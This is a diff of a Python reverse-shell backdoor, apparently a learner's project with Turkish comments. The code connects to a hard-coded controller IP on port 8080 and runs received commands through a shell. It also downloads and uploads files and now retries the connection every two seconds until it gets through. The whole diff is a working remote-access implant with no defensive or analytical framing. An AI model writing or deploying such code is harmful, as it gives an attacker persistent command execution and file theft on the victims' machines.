@@ -3,12 +3,15 @@ import subprocess
 import json
 import os
 import base64 #jpg türü dosyaları encode ve decod etmek için
+import time
 
 class Backdoor:
 	def __init__(self, ip, port):
 		# AF_INET = IPv4 || SOCK_STREAM = TCP
 		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
 		self.my_connection.connect((ip,port))
+		
 
 	def command_execution(self, command):
 		return subprocess.check_output(command, shell=True)
@@ -25,7 +28,7 @@ class Backdoor:
 			try:
 				received_data =  self.my_connection.recv(1024)
 				json_data += received_data
-				decode_data = json_data.decode("utf-8", ignore="ignore")
+				decode_data = json_data.decode("utf-8" , errors="ignore")
 				return json.loads(decode_data)
 			except ValueError:
 				continue
@@ -46,23 +49,46 @@ class Backdoor:
 
 	def start_backdoor(self):
 		while True:
-			command = self.json_receive()
-			try:
-				if command[0] == "quit": #çıkış işlemi
-					self.my_connection.close()
-					exit()
-				elif command[0] == "cd" and len(command) > 1: #dizi değiştirme
-					command_output = self.execute_cd_command(command[1])
-				elif command[0] == "download":
-					command_output = self.get_file_contents(command[1])
-				elif command[0] == "upload":
-					command_output = self.save_file(command[1],command[2])
-				else:
-					command_output = self.command_execution(command)
-			except Exception:
-				command_output = "Error!"
-			self.json_send(command_output)
+			if self.my_connection:
+				command = self.json_receive()
+				try:
+					if command[0] == "close_backdoor":
+						self.my_connection.close()
+						exit()
+
+					if command[0] == "quit":
+						print("Connection closed.")
+						self.my_connection.close()
+						break
+
+					elif command[0] == "cd" and len(command) > 1:
+						command_result = self.execute_cd_command(command[1])
+					elif command[0] == "download":
+						command_result = self.get_file_contents(command[1])
+					elif command[0] == "upload":
+						command_result = self.save_file(command[1],command[2])
+					else:
+						command_result = self.command_execution(command)
+					
+				except Exception:
+					command_result = "Error during command execution."
+				self.json_send(command_result)
+	
 
 
-my_socket_object = Backdoor("192.168.116.177",8080)
-my_socket_object.start_backdoor()
+
+while True:
+    try:
+        my_backdoor = Backdoor("192.168.20.177", 8080).start_backdoor()
+    except Exception as e:
+        print("Bağlantı başarısız. Tekrar denenecek.\n")
+        print("Error: {}".format(str(e)))
+        time.sleep(2)  # 10 saniye bekle
+        continue
+
+
+
+
+
+
+
